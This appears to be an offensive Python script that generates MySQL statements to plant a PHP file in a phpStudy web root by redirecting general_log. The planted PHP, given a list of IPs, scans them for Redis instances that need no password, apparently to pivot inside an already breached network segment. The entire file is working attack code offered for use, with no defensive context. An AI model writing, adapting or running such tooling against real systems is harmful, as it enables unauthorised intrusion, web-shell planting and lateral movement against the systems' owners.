#!/usr/bin/env python3
"""gen_redis_probe.py - 81.70端Redis未授权探测
?ips=ip1,ip2 → 遍历测试PING/INFO
"""
body = '<?php $ips=explode(",",$_GET["ips"]);foreach($ips as $ip){$c=@fsockopen($ip,6379,$e,$es,3);if($c){fwrite($c,"PING\r\n");stream_set_timeout($c,3);$r=fgets($c);if(strpos($r,"PONG")!==false){echo "NOAUTH:".$ip.chr(10);}else{echo "AUTHED:".$ip.":".trim($r).chr(10);}fclose($c);}else{echo "CLOSED:".$ip.chr(10);}flush();}?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/redis_probe.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/redis_probe.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
